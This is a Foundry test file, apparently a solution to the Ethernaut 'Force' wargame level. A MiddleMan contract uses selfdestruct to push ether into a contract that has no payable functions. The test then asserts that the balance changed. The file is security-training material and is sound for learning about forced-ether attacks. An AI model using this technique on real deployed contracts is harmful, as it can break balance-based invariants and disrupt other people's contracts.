// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Force.sol";

contract MiddleMan {
    function attack(address payable target) public payable {
        selfdestruct(target);
    }
}

// use selfdestruct() to force send ether to an address
// note that tho after Cancun selfdestruct() no longer deletes the code, it still transfers its Ether to the beneficiary
contract ForceTest is Test {
    Force instance;

    function setUp() public {
        instance = new Force();
    }

    function test() public {
        assertEq(address(instance).balance, 0);

        address alice = makeAddr("alice");
        uint256 amount = 1 ether;
        vm.deal(alice, amount);
        MiddleMan middleMan = new MiddleMan();

        vm.prank(alice);
        middleMan.attack{value: amount}(payable(address(instance)));

        assertEq(address(instance).balance, amount);
    }
}
